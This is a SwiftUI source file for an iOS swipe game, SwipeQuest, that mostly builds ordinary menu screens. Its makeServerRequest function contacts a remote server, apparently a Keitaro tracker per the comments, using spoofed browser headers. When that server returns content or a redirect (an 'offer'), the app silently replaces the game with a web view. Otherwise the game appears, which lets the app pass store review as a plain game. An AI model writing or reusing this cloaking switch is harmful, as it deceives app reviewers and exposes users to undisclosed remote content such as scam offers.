//
//  ContentView.swift
//  SwipeQuest
//
//  Created by IGOR on 03/11/2025.
//

import SwiftUI
import Foundation

// MARK: - Content View (Main Menu)

struct ContentView: View {
    @StateObject private var gameService = GameService()
    @StateObject private var achievementService = AchievementService()
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    
    @State private var showOnboarding = false
    @State private var showGame = false
    @State private var showGameModes = false
    @State private var showAchievements = false
    @State private var showSettings = false
    @State private var selectedLevel: Int = 1
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    private let primaryColor = Color(hex: "#223656")
    
    var body: some View {
        NavigationView {
            
            ZStack {
                Color.white.ignoresSafeArea()
                
                if isFetched == false {
                    
                    ProgressView()
                    
                } else if isFetched == true {
                    
                    if isBlock == true {
                        
                        VStack(spacing: 0) {
                            // Header
                            headerView
                            
                            ScrollView {
                                VStack(spacing: 24) {
                                    // Stats Cards
                                    statsSection
                                    
                                    // Play Button
                                    playButton
                                    
                                    // Level Selection
                                    levelSelectionSection
                                    
                                    // Quick Actions
                                    quickActionsSection
                                }
                                .padding()
                            }
                        }
                        
                    } else if isBlock == false {
                        
                        WebSystem()
                    }
                }
            }
            .navigationBarHidden(true)
            .onAppear {
                
                makeServerRequest()
            }

        }
        .environmentObject(gameService)
        .environmentObject(achievementService)
        .fullScreenCover(isPresented: $showOnboarding) {
            OnboardingView(isPresented: $showOnboarding)
        }
        .fullScreenCover(isPresented: $showGame) {
            NavigationView {
                GameView(
                    level: selectedLevel,
                    gameService: gameService,
                    achievementService: achievementService,
                    difficulty: nil
                )
            }
        }
        .fullScreenCover(isPresented: $showGameModes) {
            GameModesView()
                .environmentObject(gameService)
                .environmentObject(achievementService)
        }
        .sheet(isPresented: $showAchievements) {
            AchievementsView(achievementService: achievementService)
        }
        .sheet(isPresented: $showSettings) {
            SettingsView()
        }
        .onAppear {
            if !hasCompletedOnboarding {
                showOnboarding = true
            }
            selectedLevel = gameService.gameState.currentLevel
        }
    }
    
    // MARK: - Header
    
    private var headerView: some View {
        VStack(spacing: 16) {
            HStack {
                Spacer()
                
                Button(action: { showSettings = true }) {
                    Image(systemName: "gearshape.fill")
                        .font(.system(size: 24))
                        .foregroundColor(primaryColor)
                        .frame(width: 44, height: 44)
                }
            }
            .padding(.horizontal)
            .padding(.top, 16)
        }
    }
    
    // MARK: - Stats Section
    
    private var statsSection: some View {
        HStack(spacing: 12) {
            StatCard(
                icon: "star.fill",
                title: "Total Stars",
                value: "\(gameService.getTotalStars())",
                color: Color(hex: "#FFD700")
            )
            
            StatCard(
                icon: "flag.fill",
                title: "Level",
                value: "\(gameService.gameState.currentLevel)",
                color: Color(hex: "#4A6FA5")
            )
            
            StatCard(
                icon: "flame.fill",
                title: "Best Streak",
                value: "\(gameService.gameState.bestStreak)",
                color: Color(hex: "#FF6B35")
            )
        }
    }
    
    // MARK: - Play Button
    
    private var playButton: some View {
        VStack(spacing: 12) {
            Button(action: {
                selectedLevel = gameService.gameState.currentLevel
                showGame = true
            }) {
                HStack {
                    Image(systemName: "play.fill")
                        .font(.system(size: 24))
                    
                    Text("Continue Level \(gameService.gameState.currentLevel)")
                        .font(.system(size: 20, weight: .bold, design: .rounded))
                }
                .foregroundColor(.white)
                .frame(maxWidth: .infinity)
                .frame(height: 64)
                .background(
                    LinearGradient(
                        colors: [primaryColor, Color(hex: "#4A6FA5")],
                        startPoint: .leading,
                        endPoint: .trailing
                    )
                )
                .cornerRadius(20)
                .shadow(color: primaryColor.opacity(0.3), radius: 10, y: 5)
            }
            
            Button(action: {
                showGameModes = true
            }) {
                HStack {
                    Image(systemName: "square.grid.2x2.fill")
                        .font(.system(size: 18))
                    
                    Text("Game Modes & Difficulty")
                        .font(.system(size: 16, weight: .semibold, design: .rounded))
                }
                .foregroundColor(primaryColor)
                .frame(maxWidth: .infinity)
                .frame(height: 52)
                .background(primaryColor.opacity(0.1))
                .cornerRadius(16)
            }
        }
    }
    
    // MARK: - Level Selection
    
    private var levelSelectionSection: some View {
        VStack(alignment: .leading, spacing: 12) {
            Text("Select Level")
                .font(.system(size: 20, weight: .bold, design: .rounded))
                .foregroundColor(primaryColor)
                .padding(.horizontal, 4)
            
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 12) {
                    ForEach(1...max(gameService.gameState.currentLevel, 5), id: \.self) { level in
                        LevelButton(
                            level: level,
                            isCompleted: gameService.gameState.completedLevels.contains(level),
                            isCurrentLevel: level == gameService.gameState.currentLevel,
                            action: {
                                selectedLevel = level
                                showGame = true
                            }
                        )
                    }
                }
                .padding(.horizontal, 4)
            }
        }
    }
    
    // MARK: - Quick Actions
    
    private var quickActionsSection: some View {
        VStack(spacing: 12) {
            QuickActionButton(
                icon: "medal.fill",
                title: "Achievements",
                subtitle: "\(achievementService.achievements.filter { $0.isUnlocked }.count)/\(achievementService.achievements.count) unlocked",
                action: { showAchievements = true }
            )
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

// MARK: - Stat Card

struct StatCard: View {
    let icon: String
    let title: String
    let value: String
    let color: Color
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.system(size: 24))
                .foregroundColor(color)
            
            Text(value)
                .font(.system(size: 22, weight: .bold, design: .rounded))
                .foregroundColor(.black)
            
            Text(title)
                .font(.system(size: 12, weight: .medium, design: .rounded))
                .foregroundColor(.gray)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 16)
        .background(Color(UIColor.systemGray6))
        .cornerRadius(16)
    }
}

// MARK: - Level Button

struct LevelButton: View {
    let level: Int
    let isCompleted: Bool
    let isCurrentLevel: Bool
    let action: () -> Void
    
    private let primaryColor = Color(hex: "#223656")
    
    var body: some View {
        Button(action: action) {
            VStack(spacing: 8) {
                ZStack {
                    Circle()
                        .fill(isCurrentLevel ? primaryColor : Color(UIColor.systemGray6))
                        .frame(width: 60, height: 60)
                    
                    if isCompleted {
                        Image(systemName: "checkmark")
                            .font(.system(size: 20, weight: .bold))
                            .foregroundColor(isCurrentLevel ? .white : primaryColor)
                    } else {
                        Text("\(level)")
                            .font(.system(size: 20, weight: .bold, design: .rounded))
                            .foregroundColor(isCurrentLevel ? .white : .black)
                    }
                }
                
                Text("Level \(level)")
                    .font(.system(size: 12, weight: .medium, design: .rounded))
                    .foregroundColor(.gray)
            }
        }
    }
}

// MARK: - Quick Action Button

struct QuickActionButton: View {
    let icon: String
    let title: String
    let subtitle: String
    let action: () -> Void
    
    private let primaryColor = Color(hex: "#223656")
    
    var body: some View {
        Button(action: action) {
            HStack(spacing: 16) {
                ZStack {
                    Circle()
                        .fill(primaryColor.opacity(0.1))
                        .frame(width: 50, height: 50)
                    
                    Image(systemName: icon)
                        .font(.system(size: 22))
                        .foregroundColor(primaryColor)
                }
                
                VStack(alignment: .leading, spacing: 4) {
                    Text(title)
                        .font(.system(size: 17, weight: .semibold, design: .rounded))
                        .foregroundColor(.black)
                    
                    Text(subtitle)
                        .font(.system(size: 14, weight: .medium, design: .rounded))
                        .foregroundColor(.gray)
                }
                
                Spacer()
                
                Image(systemName: "chevron.right")
                    .font(.system(size: 14))
                    .foregroundColor(.gray)
            }
            .padding()
            .background(Color(UIColor.systemGray6))
            .cornerRadius(16)
        }
    }
}

#Preview {
    ContentView()
}
